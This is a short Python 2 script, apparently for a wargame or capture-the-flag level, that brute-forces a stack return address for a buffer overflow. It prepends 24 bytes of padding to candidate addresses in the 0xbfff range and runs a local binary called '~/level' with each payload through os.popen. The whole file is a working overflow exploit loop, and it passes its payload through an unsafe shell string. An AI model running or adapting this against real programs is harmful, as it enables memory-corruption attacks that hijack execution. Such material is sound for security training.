#!/usr/bin/env python
# -*- coding: utf-8 -*- 

hex_string = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"]

ca = 0
cb = 0
cc = 15
cd = 11
padding = "\\x42" * 24
progpath = "~/level"
import os
import subprocess

while True:
  sentence = "\\x%s%s\\x%s%s\\xff\\xbf" % (hex_string[ca],hex_string[cb],    hex_string[cc],hex_string[cd])
  print sentence
  #sentence = padding + sentence
  #print os.popen("echo $(python -c 'print \""+sentence+"\"')").read().strip(' \t\n\r')
  sentence = padding + sentence
  print os.popen( progpath +" $( python -c 'print  \""+sentence+"\"' )" ).read().strip(' \t\n\r')
  cb = cb + 1
  if cb == 16:
    cb = 0
    ca = ca + 1
    if ca == 16:
      ca = 0
      cd = cd + 1
      if cd == 16:
        cd = 0
        cc =  cc + 1
        if cc == 16:
          quit()

